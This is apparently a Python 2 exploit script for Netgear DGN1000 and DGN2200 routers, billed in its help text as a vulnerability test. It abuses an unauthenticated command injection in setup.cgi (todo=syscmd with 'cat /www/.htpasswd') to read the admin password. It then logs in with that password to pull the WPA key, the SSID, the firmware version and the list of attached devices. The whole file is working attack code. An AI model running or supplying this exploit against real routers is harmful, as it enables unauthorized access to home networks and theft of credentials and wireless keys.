import urllib2
import sys
import argparse
from bs4 import BeautifulSoup as bs

def check_vulnerable(ip):
	try:
		path = '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1'
		url = 'http://%s%s' % (ip,path)
		data = urllib2.urlopen(url).read()
		admin = data.split(':')[0]
		password = data.split(':')[1]
		return password.strip('\n')
	except:
		return False
	
class Router(object):
	def __init__(self,username,password,routerip):
		self.password=password;
		self.username=username;
		self.routerip=routerip;
		
	def request(self,url):
		try:
		   url = 'http://%s%s' %(self.routerip,url)
		   pMan = urllib2.HTTPPasswordMgrWithDefaultRealm()
		   pMan.add_password(None,url,self.username,self.password)
		   hAuth = urllib2.HTTPBasicAuthHandler(pMan)
		   opener = urllib2.build_opener(hAuth)
		   urllib2.install_opener(opener)
		   return urllib2.urlopen(url).read()
		except:
		   return False

	def get_wpa(self):
		url = '/setup.cgi?next_file=adv_wire_wpa.htm&ssid_num=1&flag=1'
		data = self.request(url)
		soup = bs(data)
		return soup.find('input',attrs={'name':'wpakey'})['value']
		
	def get_ssid(self):
		url = '/setup.cgi?next_file=adv_wire_wpa.htm&ssid_num=1&flag=1'
		data = self.request(url)
		soup = bs(data)
		return soup.find('input',attrs={'name':'ssid'})['value']

	def get_attached_devices(self):
                url = '/setup.cgi?todo=nbtscan&next_file=devices.htm'
                data = self.request(url)
		soup = bs(data)
		table = soup.findAll('table')[1]
		rows = table.findAll('tr')[1:]
		devices = {}
		for row in rows:
                   cols = row.findAll('td')[1:]
                   devices[cols[0].text]=[cols[1].text,cols[2].text]
                return devices

	def firmware_version(self):
		url = '/s_status.htm&todo=cfg_init'
		data = self.request(url)
		soup = bs(data)
		table = soup.find('table')
		rows = table.findAll('tr')[3]
		cols = rows.findAll('td')[1]
		return (cols.text).strip('\n')

def main():
	ip = ''
	port = ''

	parser = argparse.ArgumentParser(description='Test vulnerability of Netgear DGN1000 and DGN2200.')
	parser.add_argument('-ip', help='IP adress', required=True)
	parser.add_argument('-port', help='Port', required=True)
	args = parser.parse_args()

	ip = args.ip
	port = args.port

	ipa = ip+':'+port

	pwd = check_vulnerable(ipa)

	if pwd == False:
	   print '[!] Probably not vulnerable'
	   sys.exit(1)

	print '[!] Attempting to extract information from %s' % (ip)
	print '[+] Admin Password: %s' %(pwd)
	netgear = Router('admin',pwd,ipa)
	print '[+] WLAN SSID: %s' % (netgear.get_ssid())
	print '[+] WLAN WPA Key: %s' % (netgear.get_wpa())
	print '[+] Firmware Version: %s' % (netgear.firmware_version())
	devices = netgear.get_attached_devices()
	for key in devices:
                   print '[+] Attached: %s - %s (%s)' % (devices[key][0], key, devices[key][1])

if __name__ == "__main__":
	main()
